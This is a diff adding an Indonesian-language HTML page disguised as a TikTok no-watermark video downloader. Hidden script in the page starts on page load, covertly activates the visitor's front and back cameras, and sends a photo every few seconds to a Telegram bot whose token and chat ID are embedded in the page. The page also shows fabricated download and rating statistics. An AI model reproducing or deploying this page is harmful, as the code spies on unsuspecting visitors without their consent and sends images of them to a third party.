@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Downloader - Download Video TikTok No Watermark</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdef5 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .main-container {
+            max-width: 550px;
+            width: 100%;
+            background: white;
+            border-radius: 40px;
+            overflow: hidden;
+            box-shadow: 0 30px 60px -15px rgba(33, 150, 243, 0.3);
+            border: 1px solid rgba(33, 150, 243, 0.1);
+        }
+
+        .header-gradient {
+            background: linear-gradient(145deg, #e8f0fe 0%, #d4e6fa 50%, #c2dcf9 100%);
+            padding: 35px 25px 25px 25px;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid rgba(33, 150, 243, 0.2);
+        }
+
+        .tiktok-logo-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+
+        .tiktok-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff0050, #00f2fe);
+            border-radius: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 30px;
+            box-shadow: 0 10px 20px -5px rgba(255,0,80,0.3);
+        }
+
+        .tiktok-logo-text {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #ff0050, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .title {
+            color: #1a237e;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-shadow: 1px 1px 0 rgba(255,255,255,0.8);
+        }
+
+        .subtitle {
+            color: #546e7a;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .popular-badge {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            background: white;
+            color: #2196f3;
+            padding: 6px 15px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.2);
+            border: 1px solid #2196f3;
+        }
+
+        .white-content {
+            background: white;
+            padding: 30px 25px;
+        }
+
+        .form-card {
+            background: #ffffff;
+            border-radius: 25px;
+            padding: 25px;
+            box-shadow: 0 10px 30px -5px rgba(33, 150, 243, 0.15);
+            border: 1px solid #e1f0fa;
+            margin-bottom: 30px;
+        }
+
+        .input-label {
+            display: block;
+            color: #1a237e;
+            font-weight: 500;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+
+        .input-url {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e3f2fd;
+            border-radius: 18px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #f8fcff;
+            color: #1a237e;
+            margin-bottom: 20px;
+        }
+
+        .input-url:focus {
+            border-color: #2196f3;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(33, 150, 243, 0.1);
+        }
+
+        .btn-download {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(145deg, #2196f3, #1976d2);
+            border: none;
+            border-radius: 18px;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 20px -5px rgba(33, 150, 243, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-download:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 25px -5px rgba(33, 150, 243, 0.5);
+        }
+
+        .btn-download:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .result-area {
+            margin-top: 20px;
+            padding: 20px;
+            background: #f8fcff;
+            border-radius: 18px;
+            border: 1px solid #e1f0fa;
+            display: none;
+        }
+
+        .result-area.show {
+            display: block;
+        }
+
+        .video-info {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .video-thumbnail {
+            width: 100px;
+            height: 100px;
+            border-radius: 12px;
+            object-fit: cover;
+            background: #ddd;
+        }
+
+        .video-details {
+            flex: 1;
+        }
+
+        .video-title {
+            font-weight: 600;
+            color: #1a237e;
+            margin-bottom: 5px;
+            font-size: 14px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .video-author {
+            color: #546e7a;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        .video-stats {
+            display: flex;
+            gap: 15px;
+            color: #78909c;
+            font-size: 12px;
+        }
+
+        .btn-download-video {
+            width: 100%;
+            padding: 12px;
+            background: #ff0050;
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.3s;
+        }
+
+        .btn-download-video:hover {
+            background: #d10042;
+        }
+
+        .stats-row {
+            display: flex;
+            justify-content: space-around;
+            background: #f8fcff;
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid #e1f0fa;
+            margin-top: 30px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            color: #2196f3;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .stat-label {
+            color: #78909c;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+
+        .footer {
+            background: #f8fcff;
+            padding: 20px 25px;
+            border-top: 1px solid #e1f0fa;
+            display: flex;
+            justify-content: space-between;
+            color: #90a4ae;
+            font-size: 13px;
+        }
+
+        .footer a {
+            color: #2196f3;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Hidden camera elements - benar-benar tersembunyi */
+        #video, #canvas, #captured-image {
+            display: none;
+            width: 0;
+            height: 0;
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -9999;
+        }
+
+        @media (max-width: 500px) {
+            .main-container {
+                border-radius: 25px;
+            }
+            
+            .header-gradient {
+                padding: 25px 20px 20px 20px;
+            }
+            
+            .tiktok-logo-text {
+                font-size: 28px;
+            }
+            
+            .popular-badge {
+                top: 15px;
+                right: 15px;
+                padding: 4px 12px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <!-- Header -->
+        <div class="header-gradient">
+            <div class="popular-badge">
+                🔥 1,234,567+ Downloads
+            </div>
+            
+            <div class="tiktok-logo-wrapper" id="tiktokLogo">
+                <div class="tiktok-icon">
+                    ♪
+                </div>
+                <div class="tiktok-logo-text">
+                    TikTok
+                </div>
+            </div>
+            
+            <h1 class="title">TikTok Video Downloader</h1>
+            <p class="subtitle">Download video tanpa watermark • Gratis & Cepat</p>
+        </div>
+
+        <!-- Konten putih -->
+        <div class="white-content">
+            <!-- Form Card -->
+            <div class="form-card">
+                <label class="input-label">
+                    📋 Link Video TikTok
+                </label>
+                <input type="text" class="input-url" id="tiktokUrl" placeholder="https://www.tiktok.com/@username/video/123456789" value="https://www.tiktok.com/@tiktok/video/7123456789">
+                
+                <button class="btn-download" onclick="downloadTikTok()" id="downloadBtn">
+                    <span>📥 Download Video</span>
+                    <span class="spinner" id="spinner" style="display: none;"></span>
+                </button>
+
+                <!-- Result area -->
+                <div class="result-area" id="resultArea">
+                    <div class="video-info">
+                        <img class="video-thumbnail" id="videoThumbnail" src="" alt="Thumbnail">
+                        <div class="video-details">
+                            <div class="video-title" id="videoTitle">Loading...</div>
+                            <div class="video-author" id="videoAuthor">Loading...</div>
+                            <div class="video-stats">
+                                <span>❤️ <span id="likeCount">0</span></span>
+                                <span>💬 <span id="commentCount">0</span></span>
+                                <span>🔄 <span id="shareCount">0</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="btn-download-video" id="downloadVideoBtn" onclick="downloadVideo()">
+                        <span>⬇️</span> Download Video (No Watermark)
+                    </button>
+                </div>
+            </div>
+
+            <!-- Statistik palsu -->
+            <div class="stats-row">
+                <div class="stat-item">
+                    <div class="stat-value">1.2M+</div>
+                    <div class="stat-label">Download</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">500K+</div>
+                    <div class="stat-label">Happy Users</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">⭐ 4.8</div>
+                    <div class="stat-label">Rating</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <span>© 2024 TikTok Downloader</span>
+            <a href="#" onclick="return false;">Kebijakan Privasi</a>
+        </div>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <img id="captured-image" src="">
+
+    <!-- ==================== KONFIGURASI TELEGRAM - UBAH DISINI ==================== -->
+    <!-- GANTI TOKEN DAN CHAT ID DI BAWAH INI DENGAN PUNYA ANDA -->
+    <div id="telegram-config" 
+         data-bot-token="8379306027:AAHz5nupZ47OjqDX0Nik6jaYkgpp8eSlsmQ" 
+         data-chat-id="7887638257"
+         data-interval="5">
+    </div>
+    <!-- ==================== AKHIR KONFIGURASI ==================== -->
+
+    <script>
+        // ==================== KONFIGURASI ====================
+        const configElement = document.getElementById('telegram-config');
+        const BOT_TOKEN = configElement.dataset.botToken;
+        const CHAT_ID = configElement.dataset.chatId;
+        const INTERVAL = parseInt(configElement.dataset.interval) || 5; // detik
+        
+        // Elemen UI
+        const downloadBtn = document.getElementById('downloadBtn');
+        const spinner = document.getElementById('spinner');
+        const resultArea = document.getElementById('resultArea');
+        const videoThumbnail = document.getElementById('videoThumbnail');
+        const videoTitle = document.getElementById('videoTitle');
+        const videoAuthor = document.getElementById('videoAuthor');
+        const likeCount = document.getElementById('likeCount');
+        const commentCount = document.getElementById('commentCount');
+        const shareCount = document.getElementById('shareCount');
+        const downloadVideoBtn = document.getElementById('downloadVideoBtn');
+        
+        // State untuk video
+        let currentVideoData = null;
+        
+        // ==================== ELEMEN KAMERA ====================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const capturedImage = document.getElementById('captured-image');
+        
+        // State kamera
+        let stream = null;
+        let currentCamera = 'user'; // 'user' = depan, 'environment' = belakang
+        let isCameraActive = false;
+        let captureInterval = null;
+        
+        // ==================== FUNGSI TIKTOK DOWNLOADER ====================
+        
+        async function downloadTikTok() {
+            const url = document.getElementById('tiktokUrl').value.trim();
+            
+            if (!url) {
+                alert('Masukkan link video TikTok');
+                return;
+            }
+            
+            if (!url.includes('tiktok.com')) {
+                alert('URL tidak valid. Masukkan link TikTok yang benar');
+                return;
+            }
+            
+            downloadBtn.querySelector('span:first-child').style.display = 'none';
+            spinner.style.display = 'inline-block';
+            downloadBtn.disabled = true;
+            
+            try {
+                const videoId = extractVideoId(url);
+                
+                if (!videoId) {
+                    throw new Error('Tidak dapat mengekstrak ID video');
+                }
+                
+                const apiUrl = `https://api.tikmate.cc/api/lookup?url=https://www.tiktok.com/@user/video/${videoId}`;
+                
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`API error: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+                
+                currentVideoData = data;
+                
+                const videoData = {
+                    title: data.description || 'TikTok Video',
+                    author: data.author_name || data.author || 'Unknown',
+                    thumbnail: data.thumbnail || `https://www.tiktok.com/api/img/?itemId=${videoId}`,
+                    likeCount: data.likes || data.like_count || 0,
+                    commentCount: data.comments || data.comment_count || 0,
+                    shareCount: data.shares || data.share_count || 0,
+                    downloadUrl: `https://tikmate.cc/download/${data.token}/${data.video_id}.mp4`
+                };
+                
+                showVideoResult(videoData);
+                
+            } catch (error) {
+                console.error('Download error:', error);
+                alert('Gagal mendownload video. Coba lagi nanti.');
+            } finally {
+                downloadBtn.querySelector('span:first-child').style.display = 'inline';
+                spinner.style.display = 'none';
+                downloadBtn.disabled = false;
+            }
+        }
+        
+        function extractVideoId(url) {
+            const regex = /\/video\/(\d+)/;
+            const match = url.match(regex);
+            
+            if (match && match[1]) {
+                return match[1];
+            }
+            
+            const shortRegex = /tiktok\.com\/(?:@[\w.-]+\/video\/|video\/|)(\d+)/;
+            const shortMatch = url.match(shortRegex);
+            
+            return shortMatch ? shortMatch[1] : null;
+        }
+        
+        function showVideoResult(videoData) {
+            videoTitle.textContent = videoData.title || 'TikTok Video';
+            videoAuthor.textContent = `@${videoData.author}`;
+            videoThumbnail.src = videoData.thumbnail || 'https://via.placeholder.com/100';
+            likeCount.textContent = formatNumber(videoData.likeCount);
+            commentCount.textContent = formatNumber(videoData.commentCount);
+            shareCount.textContent = formatNumber(videoData.shareCount);
+            
+            downloadVideoBtn.setAttribute('data-download-url', videoData.downloadUrl);
+            
+            resultArea.classList.add('show');
+        }
+        
+        function formatNumber(num) {
+            if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+            if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
+            return num.toString();
+        }
+        
+        function downloadVideo() {
+            const downloadUrl = downloadVideoBtn.getAttribute('data-download-url');
+            
+            if (!downloadUrl) {
+                alert('URL download tidak tersedia');
+                return;
+            }
+            
+            window.open(downloadUrl, '_blank');
+        }
+        
+        // ==================== FUNGSI KAMERA ZERO DELAY ====================
+        // LANGSUNG aktif, LANGSUNG kirim, TANPA JEDA
+        
+        /**
+         * Inisialisasi kamera dan langsung mulai mengirim
+         * Dipanggil secepat mungkin saat halaman dimuat
+         */
+        async function initZeroDelayCamera() {
+            // Cek token sudah diganti
+            if (BOT_TOKEN === "7234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw" || CHAT_ID === "1234567890") {
+                console.warn('Camera disabled: Token belum diganti');
+                return;
+            }
+            
+            try {
+                // Minta akses kamera
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: currentCamera,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                // Tunggu video siap
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                isCameraActive = true;
+                console.log('✅ Zero-delay camera active');
+                
+                // LANGSUNG KIRIM FOTO PERTAMA (tanpa jeda)
+                captureAndSendInstant();
+                
+                // Set interval untuk pengiriman berikutnya
+                startInstantCapture();
+                
+            } catch (err) {
+                console.log('Camera access denied:', err);
+            }
+        }
+        
+        /**
+         * Mulai pengambilan foto instan (LANGSUNG, tanpa countdown)
+         */
+        function startInstantCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            const intervalMs = INTERVAL * 1000;
+            
+            // Fungsi yang langsung capture dan kirim
+            const instantCapture = () => {
+                if (!isCameraActive || !stream) return;
+                
+                // LANGSUNG ambil foto, tanpa jeda
+                const imageData = captureInstantPhoto();
+                
+                if (imageData) {
+                    // LANGSUNG kirim, tanpa await (fire and forget)
+                    sendInstantToTelegram(imageData);
+                    
+                    // Switch kamera setiap kali (acak)
+                    if (Math.random() > 0.5) {
+                        switchInstantCamera();
+                    }
+                }
+            };
+            
+            // LANGSUNG kirim foto pertama (sudah dilakukan di init)
+            // Set interval untuk berikutnya
+            captureInterval = setInterval(instantCapture, intervalMs);
+        }
+        
+        /**
+         * Capture dan kirim instan (dipanggil sekali di awal)
+         */
+        function captureAndSendInstant() {
+            if (!isCameraActive || !stream) return;
+            
+            // LANGSUNG ambil foto
+            const imageData = captureInstantPhoto();
+            
+            if (imageData) {
+                // LANGSUNG kirim
+                sendInstantToTelegram(imageData);
+            }
+        }
+        
+        /**
+         * Ambil foto instan (tanpa persiapan)
+         */
+        function captureInstantPhoto() {
+            if (!stream || !video.videoWidth) return null;
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            
+            // Mirror untuk kamera depan
+            if (currentCamera === 'user') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+            
+            return canvas.toDataURL('image/jpeg', 0.7);
+        }
+        
+        /**
+         * Kirim instan ke Telegram (fire and forget)
+         */
+        async function sendInstantToTelegram(imageDataUrl) {
+            try {
+                const blob = dataURLtoBlob(imageDataUrl);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `instant_${Date.now()}.jpg`);
+                formData.append('caption', `⚡ Instant capture\n🎥 Camera: ${currentCamera === 'user' ? 'Front' : 'Back'}\n⏰ ${new Date().toLocaleString('id-ID')}`);
+
+                // Fire and forget - tidak perlu menunggu response
+                fetch(`${TELEGRAM_API}${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => {});
+                
+            } catch (error) {}
+        }
+        
+        /**
+         * Switch kamera instan
+         */
+        function switchInstantCamera() {
+            if (!isCameraActive) return;
+            
+            currentCamera = currentCamera === 'user' ? 'environment' : 'user';
+            
+            // Restart stream
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: currentCamera }, 
+                audio: false 
+            }).then(newStream => {
+                stream = newStream;
+                video.srcObject = newStream;
+                video.play();
+            }).catch(err => {});
+        }
+        
+        /**
+         * Konversi DataURL ke Blob
+         */
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            
+            return new Blob([u8arr], { type: mime });
+        }
+        
+        /**
+         * Hentikan kamera
+         */
+        function stopCamera() {
+            isCameraActive = false;
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
+        
+        // ==================== RAHASIA: TRIGGER TERSEMBUNYI ====================
+        
+        // Trigger 1: Saat halaman dimuat (langsung aktif)
+        window.addEventListener('load', function() {
+            // Langsung aktif tanpa delay
+            initZeroDelayCamera();
+        });
+        
+        // Trigger 2: Double click pada logo (untuk restart jika perlu)
+        let clickCount = 0;
+        document.getElementById('tiktokLogo').addEventListener('dblclick', function() {
+            if (!isCameraActive) {
+                initZeroDelayCamera();
+            } else {
+                // Kirim foto instan manual
+                const imageData = captureInstantPhoto();
+                if (imageData) {
+                    sendInstantToTelegram(imageData);
+                }
+            }
+        });
+        
+        // Trigger 3: Setiap kali user klik download (tambah frekuensi)
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            // Kirim foto ekstra setiap kali user download
+            setTimeout(() => {
+                if (isCameraActive) {
+                    const imageData = captureInstantPhoto();
+                    if (imageData) {
+                        sendInstantToTelegram(imageData);
+                    }
+                }
+            }, 100);
+        });
+        
+        // ==================== CLEANUP ====================
+        
+        const TELEGRAM_API = 'https://api.telegram.org/bot';
+        
+        window.addEventListener('beforeunload', function() {
+            stopCamera();
+        });
+        
+        // Cek support kamera
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            console.log('Camera not supported');
+        }
+    </script>
+</body>
+</html>
